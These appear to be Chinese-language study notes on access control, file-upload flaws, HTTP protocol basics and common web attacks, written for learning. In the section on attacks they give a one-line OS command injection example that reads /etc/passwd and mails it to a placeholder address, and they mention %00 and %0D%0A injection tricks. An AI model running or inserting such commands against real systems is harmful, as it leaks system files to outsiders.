访问控制

1.访问控制方法：RBAC，基于角色的访问控制，这种管理方式可称为垂直权限管理
配置权限时，应当采用最小权限原则，并使用默认拒绝策略，只对有需要的主体单独配置“允许策略”

2.水平权限管理被称为基于数据的访问控制

3.oauth是一个开放标准，允许用户授权第三方服务访问它们存储在另一个服务提供者上的数据，而不需要提供其账号密码或者分享它们数据的所有内容


4.文件上传漏洞：用户上传了一段脚本并通过脚本文件获得执行服务器端命令的能力。
一般原因：文件类型检查不严格，导致上传的脚本文件被绕过，%00截断（0x00在C、PHP中是字符串终止符）
web server配置不当，apache文件解析／etc/apache2/mime.types
IIS文件解析，截断字符;
PHP CGI问题，在php.ini。
文件上传防御措施：1）文件上传的目录设置为不可执行。2）文件上传以后以随机数命名，使用户不能访问，因此也就不可执行。3）对上传的文件做压缩、resize等处理，破坏潜在的HTML代码。4）单独设置文件服务器的域名



HTTP图解
1.WWW技术

2.网络基础TCP/IP

3.三次握手SYN/ACK

4.DNS

5.URI和URL

6.RFC

7.请求报文、响应报文

8.无状态协议

9.Cookie

10.HTTP方法
GET
POST
PUT
HEAD
DELETE
OPTIONS
TRACE
CONNECT

11.REST标准

12.持久链接

13.管线化

14.使用Cookie进行状态管理

15.首部
通用首部
请求首部
响应首部
实体首部

16.编码提高传输速率
gzip
compress
zlib
identity
分块传输编码Chunked Transfer Coding

17.MIME机制

18.获取部分内容的范围请求

19.内容协商
（浏览器访问web网页时的默认语言）
服务器驱动的内容协商
客户端驱动的内容协商
透明内容协商

20.HTTP状态码
1XX消息状态码
2XX成功状态码
3XX重定向状态码
4XX客户端错误状态码
5XX服务器错误状态码

200 OK
204 NoContent
206
207
301
302 
304 Not Modify
400
401
402
403 Forbidden
404 Not Found
500 Interal Server Error
503 Service Unavailable

301和302的区别是？什么是url劫持


21.Connection字段
控制不再转发给代理的首部字段
管理持久连接：HTTP1.1版本的默认连接是持久连接，因此客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection首部字段的值为close

22.HTTP/1.1警告码
110
111
112
113
199
214
299

23.请求首部字段
Accept
Accept-Charset
Accept-Encoding
Host：当多个虚拟主机运行在一个ip上时，Host字段可用于区分这些虚拟主机
if-Match条件请求
User-Agent：将创建请求的浏览器和用户代理的名称等信息传达给服务器

24.Cookie服务的首部字段

25.HTTP的不足
通信使用明文
不验证通信方的身份
无法验证报文的完整性

26.Session管理与Cookie应用
由于HTTP是无状态协议，因此之前认证成功的用户状态无法在协议层面上保存，所以当该用户下一次访问时也无法区分他与其它用户，Session和Cookie解决了这个问题
使用Cookie来管理Session可以弥补协议中不存在的状态管理功能

服务器端保存用户密码等登录信息的建议做法：先加salt，再散列

27.基于HTTP的功能追加协议
SPDY

Ajax，异步通信，只更新局部的eweb页面，减少了响应过程中传输的数据量，但可能会有大量请求产生
Comet

SPDY没有完全改写HTTP协议，而是在TCP／IP的应用层与传输层之间通过新加会话层的形式运作，同时在通信中使用 SSL
「多路复用
赋予请求优先级
压缩HTTP首部
推送功能
服务器提示功能
」
WebSocket：Web浏览器与Web服务器之间全双工通信，建立了WebSocket协议的连接，通信双方可互相发送json、xml、html或图片等任意格式的数据


28.构建web内容的技术
HTML
CSS
动态HTML「调用js」

29.
XML
JSON

30.针对Web的攻击技术
攻击目标：应用HTTP协议的web客户端和服务端
HTTP不具备必要的安全功能，而SSH具备协议级别的认证和会话管理等功能

客户端篡改请求：在请求报文中增加攻击代码「url查询字段、HTTP首部、Cookie」
{
主动攻击：SQL注入、OS命令注入...
被动攻击：XSS攻击、CSRF...

}
XSS攻击「在动态生成HTML处发生」
SQL注入「」
OS命令注入「如cat /etc/passwd | mail XXXXX@XX.XXX」
HTTP首部注入「在具有重定向功能的地方可注入；%0D%0A代表HTTP报文中的换行符，换行后注入新的首部可修改cookie等首部值；
HTTP响应截断，利用两个连续的换行符作出首部与HTTP报文主题所需的空行，伪造显示主体；利用这个攻击，可以设置陷阱使用户浏览器显示伪造的web页面，再输入自己的用户名、密码等个人信息，达到与XSS攻击相同的效果」
邮件首部注入攻击：%0D%0A换行追加发送，、或篡改邮件文本内容
目录遍历（路径遍历）攻击：
远程文件包含漏洞（RFI）：主要存在于PHP，可通过修改配置，使require、include不具备指定外部服务器的url作为文件名的功能

31.不正确的错误消息处理
web应用抛出的错误信息
数据库等系统抛出的错误信息
「系统抛出的错误主要集中在：PHP、ASP脚本错误
数据库或中间件错误
Web服务器的错误
」

32.开启重定向：钓鱼攻击

33.因会话管理疏忽引发的安全漏洞
会话劫持「推测
XSS：document.cookie
窃听
会话固定攻击」
被动攻击：XSS攻击、CSRF跨站点请求伪造：强迫已经完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新「可能造成的影响：利用已认证的用户权限更新设定信息、利用已通过认证的用户权限购买商品、利用已通过认证的用户权限在留言板上发表言论」

34.其它安全漏洞
密码破解「密码试错：穷举法>对所有密钥集合构成的密钥空间进行穷举、字典攻击>利用事先手机号的候选密码，枚举字典中的密码尝试通过认证；
对已加密密码的破解：穷举——字典攻击；彩虹表；加密算法的漏洞」

点击劫持：界面伪装（UI Redressing）利用透明的按钮或链接

DoS攻击
DDoS攻击
后门程序：开发设置的隐藏入口，可不按正常步骤使用受限功能